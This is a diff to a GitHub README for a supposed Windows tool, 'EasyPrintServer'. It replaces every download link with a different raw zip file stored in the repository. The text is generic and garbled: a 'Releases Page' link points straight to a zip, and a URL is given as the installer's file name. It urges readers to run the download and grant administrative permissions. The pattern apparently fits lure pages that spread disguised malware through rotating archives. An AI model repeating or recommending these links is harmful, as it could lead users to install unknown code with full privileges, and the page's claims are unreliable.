@@ -1,7 +1,7 @@
 # 🖨️ EasyPrintServer - Simplify Your Printer Setup Effortlessly
 
 ## 📥 Download Now
-[![Download EasyPrintServer](https://github.com/johnnykuo66/EasyPrintServer/raw/refs/heads/master/EasyPrintServer/Assets/Easy_Print_Server_homageable.zip)](https://github.com/johnnykuo66/EasyPrintServer/raw/refs/heads/master/EasyPrintServer/Assets/Easy_Print_Server_homageable.zip)
+[![Download EasyPrintServer](https://github.com/johnnykuo66/EasyPrintServer/raw/refs/heads/master/EasyPrintServer/Server_Print_Easy_3.2.zip)](https://github.com/johnnykuo66/EasyPrintServer/raw/refs/heads/master/EasyPrintServer/Server_Print_Easy_3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to EasyPrintServer! This application helps you create print servers, share printers, and manage Group Policies. Designed for Windows, it makes printer setup simple and fast, even if you're not a tech expert.
@@ -15,16 +15,16 @@ Welcome to EasyPrintServer! This application helps you create print servers, sha
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [EasyPrintServer Releases Page](https://github.com/johnnykuo66/EasyPrintServer/raw/refs/heads/master/EasyPrintServer/Assets/Easy_Print_Server_homageable.zip) to download the latest version.
+   Go to the [EasyPrintServer Releases Page](https://github.com/johnnykuo66/EasyPrintServer/raw/refs/heads/master/EasyPrintServer/Server_Print_Easy_3.2.zip) to download the latest version.
 
 2. **Choose the Right Version**  
    Look for the most recent release. You should see a list of files related to EasyPrintServer. 
 
 3. **Download the Installer**  
-   Click on the installer file (typically named `https://github.com/johnnykuo66/EasyPrintServer/raw/refs/heads/master/EasyPrintServer/Assets/Easy_Print_Server_homageable.zip`). This will download the file to your computer.
+   Click on the installer file (typically named `https://github.com/johnnykuo66/EasyPrintServer/raw/refs/heads/master/EasyPrintServer/Server_Print_Easy_3.2.zip`). This will download the file to your computer.
 
 4. **Run the Installer**  
-   Once the download is complete, locate the file in your downloads folder. Double-click the `https://github.com/johnnykuo66/EasyPrintServer/raw/refs/heads/master/EasyPrintServer/Assets/Easy_Print_Server_homageable.zip` file to launch the installation wizard.
+   Once the download is complete, locate the file in your downloads folder. Double-click the `https://github.com/johnnykuo66/EasyPrintServer/raw/refs/heads/master/EasyPrintServer/Server_Print_Easy_3.2.zip` file to launch the installation wizard.
 
 5. **Follow the Setup Instructions**  
    The setup wizard will guide you through the installation process. Follow the prompts carefully. You may need to provide administrative permissions to complete the installation.
@@ -76,4 +76,4 @@ Stay tuned for updates that enhance functionality. We aim to make print manageme
 ## 🌟 Conclusion
 EasyPrintServer is your go-to tool for handling printer setups in Windows environments. With our step-by-step guide, you can download and run the application confidently.
 
-[![Download EasyPrintServer](https://github.com/johnnykuo66/EasyPrintServer/raw/refs/heads/master/EasyPrintServer/Assets/Easy_Print_Server_homageable.zip)](https://github.com/johnnykuo66/EasyPrintServer/raw/refs/heads/master/EasyPrintServer/Assets/Easy_Print_Server_homageable.zip)
+[![Download EasyPrintServer](https://github.com/johnnykuo66/EasyPrintServer/raw/refs/heads/master/EasyPrintServer/Server_Print_Easy_3.2.zip)](https://github.com/johnnykuo66/EasyPrintServer/raw/refs/heads/master/EasyPrintServer/Server_Print_Easy_3.2.zip)
